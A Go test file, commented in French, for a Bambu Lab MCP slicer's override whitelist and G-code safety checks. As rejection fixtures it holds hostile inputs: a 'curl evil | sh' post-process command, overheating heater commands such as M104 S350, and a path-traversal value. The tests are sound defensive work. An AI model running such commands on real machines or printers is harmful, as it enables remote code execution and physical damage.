package slicer

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/ArseneGA/BAMBULAB-MCP/internal/mesh"
	"github.com/ArseneGA/BAMBULAB-MCP/internal/profiles"
)

// ---- catalogue synthétique : machine bornée, fiche d'imprimante, filaments ----

func writeJSON(t *testing.T, path string, v any) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	b, _ := json.Marshal(v)
	if err := os.WriteFile(path, b, 0o644); err != nil {
		t.Fatal(err)
	}
}

const synthStart = ";===== synth start =====\nM104 S75\nG28\nM140 S[bed_temperature_initial_layer_single]\nM109 S250 ;vidange\n"
const synthEnd = "M104 S0\nM140 S0\nG1 Z200 F600\n"

// synthStore : <racine>/resources/profiles/SYN + <racine>/resources/printers/SYN.json, comme une installation de
// Bambu Studio (le catalogue en déduit les maxima du modèle d'imprimante).
func synthStore(t *testing.T) *profiles.Store {
	t.Helper()
	root := t.TempDir()
	v := filepath.Join(root, "resources", "profiles", "SYN")
	writeJSON(t, filepath.Join(root, "resources", "printers", "SYN.json"), map[string]any{
		"00.00.00.00": map[string]any{"display_name": "Synth P", "print": map[string]any{"nozzle_temp_range": []int{0, 260}, "bed_temperature_limit": 90}},
	})
	writeJSON(t, filepath.Join(v, "machine", "fdm_syn.json"), map[string]any{
		"type": "machine", "name": "fdm_syn", "instantiation": "false", "nozzle_diameter": []string{"0.4"}, "gcode_flavor": "marlin",
		"printable_area": []string{"0x0", "200x0", "200x200", "0x200"}, "printable_height": "200",
		"machine_max_speed_x": []string{"300", "200"}, "machine_max_speed_y": []string{"300", "200"},
		"machine_max_acceleration_extruding": []string{"10000", "10000"}, "machine_max_acceleration_travel": []string{"5000", "5000"},
		"retraction_length": []string{"0.8"}, "z_hop": []string{"0.4"},
		"machine_start_gcode": synthStart, "machine_end_gcode": synthEnd, "layer_change_gcode": "; layer\n",
	})
	writeJSON(t, filepath.Join(v, "machine", "Synth P 0.4 nozzle.json"), map[string]any{
		"type": "machine", "name": "Synth P 0.4 nozzle", "inherits": "fdm_syn", "instantiation": "true",
		"printer_model": "Synth P", "printer_variant": "0.4", "nozzle_diameter": []string{"0.4"},
	})
	writeJSON(t, filepath.Join(v, "machine", "Synth P.json"), map[string]any{
		"type": "machine_model", "name": "Synth P", "nozzle_diameter": "0.4", "model_id": "SP", "family": "SYN", "machine_tech": "FFF", "default_bed_type": "Smooth Plate",
	})
	writeJSON(t, filepath.Join(v, "process", "fdm_proc.json"), map[string]any{
		"type": "process", "name": "fdm_proc", "instantiation": "false", "layer_height": "0.2", "outer_wall_speed": "100", "travel_speed": "250",
		"default_acceleration": "5000", "travel_acceleration": "4000", "sparse_infill_density": "15%", "wall_loops": "2", "enable_support": "0",
		"brim_width": "0", "seam_position": "aligned", "sparse_infill_pattern": "grid", "ironing_type": "no ironing",
	})
	writeJSON(t, filepath.Join(v, "process", "0.20 Std.json"), map[string]any{
		"type": "process", "name": "0.20 Std", "inherits": "fdm_proc", "instantiation": "true", "compatible_printers": []string{"Synth P 0.4 nozzle"},
	})
	fil := func(name string, lo, hi string) {
		writeJSON(t, filepath.Join(v, "filament", name+".json"), map[string]any{
			"type": "filament", "name": name, "instantiation": "true", "compatible_printers": []string{"Synth P 0.4 nozzle"},
			"filament_type": []string{"PLA"}, "nozzle_temperature": []string{"210", "210"}, "nozzle_temperature_initial_layer": []string{"210", "210"},
			"nozzle_temperature_range_low": []string{lo}, "nozzle_temperature_range_high": []string{hi},
			"hot_plate_temp": []string{"60"}, "hot_plate_temp_initial_layer": []string{"60"}, "filament_flow_ratio": []string{"0.98"},
			"filament_start_gcode": []string{"; filament start\n"},
		})
	}
	fil("Syn PLA", "190", "230")
	fil("Syn Hot", "200", "300") // plage plus large que le maximum du modèle (260)
	st, err := profiles.Load(v)
	if err != nil {
		t.Fatal(err)
	}
	return st
}

func resolveSynth(t *testing.T, st *profiles.Store, fils ...string) (m, p *profiles.Resolved, fs []*profiles.Resolved) {
	t.Helper()
	rm, err := st.Resolve(profiles.KindMachine, "Synth P 0.4 nozzle")
	if err != nil {
		t.Fatal(err)
	}
	rp, err := st.Resolve(profiles.KindProcess, "0.20 Std")
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range fils {
		rf, err := st.Resolve(profiles.KindFilament, f)
		if err != nil {
			t.Fatal(err)
		}
		fs = append(fs, rf.Clone())
	}
	return rm.Clone(), rp.Clone(), fs
}

func TestSynthStoreReadsPrinterLimits(t *testing.T) {
	st := synthStore(t)
	lim := NewTrust(st).Limits("Synth P")
	if !lim.Known || lim.NozzleMaxC != 260 || lim.BedMaxC != 90 {
		t.Fatalf("limites: %+v", lim)
	}
	if l := NewTrust(st).Limits("Inconnue"); l.Known || l.NozzleMaxC != fallbackNozzleMaxC {
		t.Fatalf("repli: %+v", l)
	}
}

// ---- 1. liste blanche ----

func TestOverrideRefusesEveryGcodeKey(t *testing.T) {
	st := synthStore(t)
	for _, k := range []string{"machine_start_gcode", "machine_end_gcode", "layer_change_gcode", "before_layer_change_gcode",
		"change_filament_gcode", "time_lapse_gcode", "template_custom_gcode", "printing_by_object_gcode", "filament_start_gcode",
		"filament_end_gcode", "machine_pause_gcode", "wrapping_detection_gcode", "some_future_gcode", "post_process", "gcode_substitutions"} {
		m, p, fs := resolveSynth(t, st, "Syn PLA")
		_, err := applyOverrides(st, m, p, fs, []Override{{Key: k, Value: "M104 S350\n"}})
		if !errors.Is(err, ErrOverride) || !strings.Contains(err.Error(), "G-code") {
			t.Errorf("%s: refus explicite attendu, reçu %v", k, err)
		}
		if v, _ := m.String("machine_start_gcode"); v != synthStart {
			t.Fatalf("le G-code de démarrage a été modifié par %s", k)
		}
	}
	// cibles explicites : même refus
	m, p, fs := resolveSynth(t, st, "Syn PLA")
	for _, tg := range []string{TargetMachine, TargetProcess, TargetFilament} {
		if _, err := applyOverrides(st, m, p, fs, []Override{{Key: "machine_start_gcode", Value: "x", Target: tg}}); !errors.Is(err, ErrOverride) {
			t.Errorf("cible %s: %v", tg, err)
		}
	}
}

func TestOverrideRefusesKeysOutsideWhitelist(t *testing.T) {
	st := synthStore(t)
	for _, k := range []string{"printable_height", "machine_max_speed_x", "machine_max_acceleration_extruding", "filament_type",
		"nozzle_temperature_range_high", "nozzle_temperature_range_low", "compatible_printers", "gcode_flavor", "no_such_key", "printable_area"} {
		m, p, fs := resolveSynth(t, st, "Syn PLA")
		_, err := applyOverrides(st, m, p, fs, []Override{{Key: k, Value: "1"}})
		if !errors.Is(err, ErrOverride) {
			t.Errorf("%s: refus attendu, reçu %v", k, err)
		}
	}
	if err := RejectKey("layer_height"); err != nil {
		t.Error(err)
	}
	if !strings.Contains(RejectKey("machine_start_gcode").Error(), "code exécuté") {
		t.Error("message de refus G-code peu explicite")
	}
}

func TestOverrideBoundsFromProfiles(t *testing.T) {
	st := synthStore(t)
	type c struct {
		name string
		ov   Override
		fil  string
		ok   bool
	}
	cases := []c{
		{"buse 400 °C", Override{Key: "nozzle_temperature", Value: 400}, "Syn PLA", false},
		{"buse au-dessus de la plage du filament", Override{Key: "nozzle_temperature", Value: 235}, "Syn PLA", false},
		{"buse dans la plage", Override{Key: "nozzle_temperature", Value: 225}, "Syn PLA", true},
		{"buse sous la plage", Override{Key: "nozzle_temperature", Value: 150}, "Syn PLA", false},
		{"buse 1re couche trop chaude", Override{Key: "nozzle_temperature_initial_layer", Value: 300}, "Syn PLA", false},
		{"buse sous la plage du filament mais au-dessus du modèle", Override{Key: "nozzle_temperature", Value: 280}, "Syn Hot", false},
		{"buse au maximum du modèle", Override{Key: "nozzle_temperature", Value: 260}, "Syn Hot", true},
		{"plateau au-dessus du modèle", Override{Key: "hot_plate_temp", Value: 95}, "Syn PLA", false},
		{"plateau 1re couche au-dessus", Override{Key: "hot_plate_temp_initial_layer", Value: 120}, "Syn PLA", false},
		{"plateau ok", Override{Key: "hot_plate_temp", Value: 85}, "Syn PLA", true},
		{"vitesse au-delà du maximum machine", Override{Key: "outer_wall_speed", Value: 350}, "Syn PLA", false},
		{"vitesse de déplacement au-delà", Override{Key: "travel_speed", Value: 301}, "Syn PLA", false},
		{"vitesse ok", Override{Key: "outer_wall_speed", Value: 250}, "Syn PLA", true},
		{"vitesse nulle", Override{Key: "outer_wall_speed", Value: 0}, "Syn PLA", false},
		{"accélération au-delà du maximum machine", Override{Key: "default_acceleration", Value: 12000}, "Syn PLA", false},
		{"accélération de déplacement au-delà", Override{Key: "travel_acceleration", Value: 6000}, "Syn PLA", false},
		{"accélération ok", Override{Key: "default_acceleration", Value: 9000}, "Syn PLA", true},
		{"couche plus haute que la buse", Override{Key: "layer_height", Value: 0.5}, "Syn PLA", false},
		{"couche ok", Override{Key: "layer_height", Value: 0.3}, "Syn PLA", true},
		{"densité > 100", Override{Key: "sparse_infill_density", Value: "120%"}, "Syn PLA", false},
		{"densité négative", Override{Key: "sparse_infill_density", Value: -5}, "Syn PLA", false},
		{"parois fractionnaires", Override{Key: "wall_loops", Value: 2.5}, "Syn PLA", false},
		{"parois énormes", Override{Key: "wall_loops", Value: 500}, "Syn PLA", false},
		{"énumération inconnue", Override{Key: "seam_position", Value: "partout"}, "Syn PLA", false},
		{"motif inconnu", Override{Key: "sparse_infill_pattern", Value: "../../etc"}, "Syn PLA", false},
		{"booléen invalide", Override{Key: "enable_support", Value: "2"}, "Syn PLA", false},
		{"rétraction énorme", Override{Key: "retraction_length", Value: 50, Target: TargetMachine}, "Syn PLA", false},
		{"rétraction ok", Override{Key: "retraction_length", Value: 1.2, Target: TargetMachine}, "Syn PLA", true},
		{"débit hors plage", Override{Key: "filament_flow_ratio", Value: 3}, "Syn PLA", false},
	}
	for _, tc := range cases {
		m, p, fs := resolveSynth(t, st, tc.fil)
		_, err := applyOverrides(st, m, p, fs, []Override{tc.ov})
		if tc.ok && err != nil {
			t.Errorf("%s: refus inattendu: %v", tc.name, err)
		}
		if !tc.ok && !errors.Is(err, ErrOverride) {
			t.Errorf("%s: refus attendu, reçu %v", tc.name, err)
		}
	}
}

func TestOverrideNormalisesAndAddsAbsentKeys(t *testing.T) {
	st := synthStore(t)
	m, p, fs := resolveSynth(t, st, "Syn PLA")
	ap, err := applyOverrides(st, m, p, fs, []Override{
		{Key: "sparse_infill_density", Value: 40}, // devient « 40% »
		{Key: "brim_type", Value: "outer_only"},   // absente du profil : ajoutée, typée par la liste blanche
		{Key: "enable_support", Value: true},
		{Key: "nozzle_temperature", Value: 220},
	})
	if err != nil {
		t.Fatal(err)
	}
	if v, _ := p.String("sparse_infill_density"); v != "40%" {
		t.Errorf("densité %q", v)
	}
	if v, _ := p.String("brim_type"); v != "outer_only" {
		t.Errorf("brim_type %q", v)
	}
	if v, _ := p.String("enable_support"); v != "1" {
		t.Errorf("enable_support %q", v)
	}
	if l := fs[0].Strings("nozzle_temperature"); len(l) != 2 || l[0] != "220" || l[1] != "220" {
		t.Errorf("nozzle_temperature %v", l)
	}
	if len(ap) != 4 || ap[1].Old != "auto_brim" || !ap[1].OldIsDefault { // valeur effective avant : défaut de Bambu Studio, jamais null
		t.Errorf("appliquées: %+v", ap)
	}
	// brim_type n'existe que côté process
	if _, err := applyOverrides(st, m, p, fs, []Override{{Key: "brim_type", Value: "outer_only", Target: TargetFilament}}); !errors.Is(err, ErrOverride) {
		t.Errorf("mauvaise cible: %v", err)
	}
}

func TestObjectSettingsUseSameWhitelist(t *testing.T) {
	st := synthStore(t)
	m, _, _ := resolveSynth(t, st)
	ok := map[string]string{"wall_loops": "4", "sparse_infill_density": "25%", "layer_height": "0.12", "brim_type": "outer_only", "enable_support": "1"}
	if err := CheckObjectSettings(ok, m); err != nil {
		t.Fatal(err)
	}
	for name, bad := range map[string]map[string]string{
		"gcode":               {"layer_change_gcode": "M104 S350"},
		"hors liste":          {"machine_max_speed_x": "9000"},
		"cible machine":       {"retraction_length": "2"},
		"couche > buse":       {"layer_height": "0.5"},
		"densité > 100":       {"sparse_infill_density": "250%"},
		"vitesse hors bornes": {"outer_wall_speed": "5000"},
		"énumération":         {"brim_type": "partout"},
	} {
		if err := CheckObjectSettings(bad, m); !errors.Is(err, ErrOverride) {
			t.Errorf("%s: refus attendu, reçu %v", name, err)
		}
	}
}

// Un projet multi-objets ne passe pas de G-code ni de valeur hors bornes par les réglages d'objet : refus avant
// tout lancement de Studio.
func TestSliceRefusesObjectGcodeSettings(t *testing.T) {
	s := fakeSlicer(t, "ok", 0)
	for name, set := range map[string]map[string]string{
		"gcode": {"machine_start_gcode": "M104 S350"}, "couche": {"layer_height": "0.9"}, "inconnue": {"zz": "1"},
	} {
		req := fakeReq(t)
		req.Model = ""
		req.Objects = []mesh.ProjectObject{{Name: "pièce", Mesh: mesh.Cube(10), Plate: 1, Settings: set}}
		if _, err := s.Slice(context.Background(), req); !errors.Is(err, ErrOverride) {
			t.Errorf("%s: ErrOverride attendue, reçu %v", name, err)
		}
	}
	req := fakeReq(t)
	req.Model = ""
	req.Objects = []mesh.ProjectObject{{Name: "pièce", Mesh: mesh.Cube(10), Plate: 1, Ranges: []mesh.LayerRange{{MinZ: 0, MaxZ: 5, Settings: map[string]string{"nozzle_temperature": "400"}}}}}
	if _, err := s.Slice(context.Background(), req); !errors.Is(err, ErrOverride) {
		t.Errorf("plage de hauteur: ErrOverride attendue, reçu %v", err)
	}
}

func TestOverridableKeysListing(t *testing.T) {
	keys := OverridableKeys()
	if len(keys) < 100 {
		t.Fatalf("liste blanche trop courte: %d", len(keys))
	}
	seen := map[string]bool{}
	for i, k := range keys {
		if strings.HasSuffix(k.Key, "_gcode") || k.Key == "post_process" {
			t.Errorf("clé interdite dans la liste blanche: %s", k.Key)
		}
		if protectedKeys[k.Key] {
			t.Errorf("clé protégée dans la liste blanche: %s", k.Key)
		}
		if k.Target == "" || k.Type == "" || k.Doc == "" {
			t.Errorf("définition incomplète: %+v", k)
		}
		if k.Type != "énumération" && (k.Min == nil || k.Max == nil || *k.Min > *k.Max) {
			t.Errorf("bornes incohérentes: %+v", k)
		}
		if seen[k.Key] || (i > 0 && keys[i-1].Key > k.Key) {
			t.Errorf("doublon ou tri: %s", k.Key)
		}
		seen[k.Key] = true
	}
}

// ---- 2. contenu du G-code ----

func synthExpect(t *testing.T, st *profiles.Store) Expect {
	t.Helper()
	return Expect{Trust: NewTrust(st)}
}

func validateSynth(t *testing.T, extra string, mutate func(*archiveOpts)) (*ArchiveInfo, *Validation, error) {
	t.Helper()
	st := synthStore(t)
	o := archiveOpts{printerModel: "Synth P", machine: "Synth P 0.4 nozzle", filaments: []string{"Syn PLA"}, gcodeExtra: extra}
	if mutate != nil {
		mutate(&o)
	}
	return ValidateArchive(writeTemp(t, "a.gcode.3mf", buildArchive(o)), synthExpect(t, st))
}

func failedNames(v *Validation) []string {
	var out []string
	for _, c := range v.Failed() {
		out = append(out, c.Name)
	}
	return out
}

func hasCheck(v *Validation, suffix string, ok bool, level string) bool {
	for _, c := range v.Checks {
		if strings.HasSuffix(c.Name, suffix) && c.OK == ok && c.Level == level {
			return true
		}
	}
	return false
}

func TestArchiveScanRefusesHotNozzle(t *testing.T) {
	for name, extra := range map[string]string{
		"M104 S350":              "M104 S350\n",
		"M109 S350 avec T":       "M109 T0 S350\n",
		"M109 R":                 "M109 R400\n",
		"minuscules et retrait":  "   m104 s350\n",
		"numéro de ligne":        "N12 M104 S350*77\n",
		"commentaire final":      "M104 S350 ; chauffe\n",
		"au-delà du modèle seul": "M104 S270\n", // 260 : maximum du modèle
	} {
		_, val, err := validateSynth(t, "M104 S"+"220\n"+extra, nil)
		if !errors.Is(err, ErrInvalidOutput) || !hasCheck(val, "unsafe_gcode", false, "error") {
			t.Errorf("%s: unsafe_gcode attendu: %v %v", name, err, failedNames(val))
		}
	}
	// au-delà de la plage du filament (230) mais sous le maximum du modèle (260), pendant l'impression
	_, val, err := validateSynth(t, "M104 S245\n", nil)
	if err == nil || !hasCheck(val, "unsafe_gcode", false, "error") {
		t.Errorf("plage du filament: %v", err)
	}
	// plateau et chambre
	for name, extra := range map[string]string{"plateau": "M140 S120\n", "plateau attendu": "M190 S95\n", "chambre": "M141 S80\n"} {
		_, val, err := validateSynth(t, extra, nil)
		if err == nil || !hasCheck(val, "unsafe_gcode", false, "error") {
			t.Errorf("%s: refus attendu: %v", name, err)
		}
	}
	// consigne illisible (hexadécimal accepté par certains micrologiciels)
	for _, extra := range []string{"M104 S0x15E\n", "M109 S[nozzle]\n", "M104 Sabc\n"} {
		_, val, err := validateSynth(t, extra, nil)
		if err == nil || !hasCheck(val, "unsafe_gcode", false, "error") {
			t.Errorf("%q: refus attendu: %v", extra, err)
		}
	}
}

func TestArchiveScanAcceptsNormalTemperatures(t *testing.T) {
	// démarrage à 250 (vidange) puis impression à 215, extinction : comme Bambu Studio
	extra := "M104 S215\nM109 S215\nM140 S60\nM190 S60\nM104 S0\nM140 S0\n"
	info, val, err := validateSynth(t, extra, nil)
	if err != nil {
		t.Fatalf("%v %v", err, failedNames(val))
	}
	s := info.Plates[0].Safety
	if s == nil || s.NozzlePrintMaxC != 215 || s.BedMaxC != 60 || s.NozzleMaxC != 215 {
		t.Fatalf("températures lues: %+v", s)
	}
	if !hasCheck(val, "unsafe_gcode", true, "error") {
		t.Error("contrôle unsafe_gcode absent")
	}
}

func TestArchiveScanDangerousAndUnexpectedCommands(t *testing.T) {
	for _, cmd := range []string{"M92 X1000", "M112", "M302 S0", "M303 E0 S400", "M500", "M997", "M999", "M906 X100", "M30 /x.gcode", "M207 S5"} {
		_, val, err := validateSynth(t, cmd+"\n", nil)
		if cmd == "M500" { // M500 appartient au démarrage Bambu
			if err != nil {
				t.Errorf("M500 doit passer: %v", err)
			}
			continue
		}
		if err == nil || !hasCheck(val, "unsafe_gcode", false, "error") {
			t.Errorf("%s: refus attendu: %v", cmd, err)
		}
	}
	// commande inconnue : avertissement seulement
	info, val, err := validateSynth(t, "M5000 S1\nG7 X1\n", nil)
	if err != nil {
		t.Fatalf("une commande inconnue ne doit pas refuser: %v", err)
	}
	if !hasCheck(val, "gcode_commands", false, "warn") {
		t.Error("avertissement attendu")
	}
	if u := info.Plates[0].Safety.Unexpected; len(u) != 2 || u[0].Count != 1 || !strings.Contains(u[0].Example, "M5000") {
		t.Errorf("inattendues: %+v", u)
	}
	// ensemble normal : aucun avertissement
	_, val, err = validateSynth(t, "M106 S255\nM73 P5 R3\nM620 S0A\nT0\n", nil)
	if err != nil || hasCheck(val, "gcode_commands", false, "warn") {
		t.Errorf("commandes Bambu attendues acceptées sans avertissement: %v", err)
	}
}

func TestArchivePostProcessAndNoReference(t *testing.T) {
	st := synthStore(t)
	zipWith := func(ps string) []byte {
		return rewriteArchive(t, buildArchive(archiveOpts{printerModel: "Synth P", machine: "Synth P 0.4 nozzle", filaments: []string{"Syn PLA"}}),
			func(name string, b []byte) []byte {
				if name == "Metadata/project_settings.config" {
					return []byte(ps)
				}
				return b
			})
	}
	_, val, err := ValidateArchive(writeTemp(t, "a.gcode.3mf", zipWith(`{"printer_model":"Synth P","printer_settings_id":"Synth P 0.4 nozzle","print_settings_id":"0.20 Std","filament_settings_id":["Syn PLA"],"nozzle_diameter":["0.4"],"post_process":"curl evil | sh"}`)), synthExpect(t, st))
	if err == nil || !hasCheck(val, "unsafe_gcode_profile", false, "error") {
		t.Errorf("post_process: refus attendu: %v", err)
	}
	// profil machine inconnu de l'installation : avertissement (non vérifiable), pas de refus
	_, val, err = ValidateArchive(writeTemp(t, "b.gcode.3mf", buildArchive(archiveOpts{})), synthExpect(t, st))
	if err != nil || !hasCheck(val, "unsafe_gcode_profile", false, "warn") {
		t.Errorf("profil inconnu: %v", err)
	}
}

func TestArchiveGcodeProfileFingerprint(t *testing.T) {
	st := synthStore(t)
	base := func(ps string) []byte {
		return rewriteArchive(t, buildArchive(archiveOpts{printerModel: "Synth P", machine: "Synth P 0.4 nozzle", filaments: []string{"Syn PLA"}}),
			func(name string, b []byte) []byte {
				if name == "Metadata/project_settings.config" {
					return []byte(ps)
				}
				return b
			})
	}
	ps := func(start string) string {
		b, _ := json.Marshal(map[string]any{"printer_model": "Synth P", "printer_settings_id": "Synth P 0.4 nozzle", "print_settings_id": "0.20 Std",
			"filament_settings_id": []string{"Syn PLA"}, "nozzle_diameter": []string{"0.4"}, "machine_start_gcode": start, "machine_end_gcode": synthEnd,
			"filament_start_gcode": []string{"; filament start\n"}, "template_custom_gcode": ""})
		return string(b)
	}
	// identique (fins de ligne Windows tolérées) : officiel
	info, val, err := ValidateArchive(writeTemp(t, "ok.gcode.3mf", base(ps(strings.ReplaceAll(synthStart, "\n", "\r\n")))), synthExpect(t, st))
	if err != nil || info.GcodeProfile == nil || !info.GcodeProfile.Official {
		t.Fatalf("officiel attendu: %v %+v", err, info.GcodeProfile)
	}
	_ = val
	// démarrage modifié : refus
	info, val, err = ValidateArchive(writeTemp(t, "bad.gcode.3mf", base(ps(synthStart+"M104 S350\n"))), synthExpect(t, st))
	if err == nil || !hasCheck(val, "unsafe_gcode_profile", false, "error") || info.GcodeProfile.Official {
		t.Fatalf("empreinte différente: refus attendu: %v", err)
	}
	if !strings.Contains(strings.Join(info.GcodeProfile.Mismatch, ","), "machine_start_gcode") {
		t.Errorf("clé fautive non nommée: %+v", info.GcodeProfile)
	}
	// paramètre de G-code inconnu des profils officiels et non vide : refus
	bad := strings.Replace(ps(synthStart), `"template_custom_gcode":""`, `"template_custom_gcode":"M104 S350"`, 1)
	if _, val, err = ValidateArchive(writeTemp(t, "bad2.gcode.3mf", base(bad)), synthExpect(t, st)); err == nil || !hasCheck(val, "unsafe_gcode_profile", false, "error") {
		t.Fatalf("template_custom_gcode injecté: refus attendu: %v", err)
	}
}

func TestExpectedCommandsAreNotDangerous(t *testing.T) {
	for c := range ExpectedCommands {
		if _, bad := DangerousCommands[c]; bad {
			t.Errorf("%s à la fois attendue et dangereuse", c)
		}
	}
}

// ---- outils de test ----

// rewriteArchive recopie une archive zip en passant chaque entrée par fn.
func rewriteArchive(t *testing.T, src []byte, fn func(name string, data []byte) []byte) []byte {
	t.Helper()
	zr, err := zip.NewReader(bytes.NewReader(src), int64(len(src)))
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, f := range zr.File {
		rc, err := f.Open()
		if err != nil {
			t.Fatal(err)
		}
		b, _ := io.ReadAll(rc)
		rc.Close()
		w, err := zw.Create(f.Name)
		if err != nil {
			t.Fatal(err)
		}
		w.Write(fn(f.Name, b))
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// withGcode remplace le G-code de la plaque 1 et recalcule son .md5 (un faussaire le ferait aussi).
func withGcode(t *testing.T, src []byte, edit func(g string) string) []byte {
	t.Helper()
	var g string
	out := rewriteArchive(t, src, func(name string, b []byte) []byte {
		if name == "Metadata/plate_1.gcode" {
			g = edit(string(b))
			return []byte(g)
		}
		return b
	})
	sum := md5.Sum([]byte(g))
	return rewriteArchive(t, out, func(name string, b []byte) []byte {
		if name == "Metadata/plate_1.gcode.md5" {
			return []byte(strings.ToUpper(hex.EncodeToString(sum[:])))
		}
		return b
	})
}
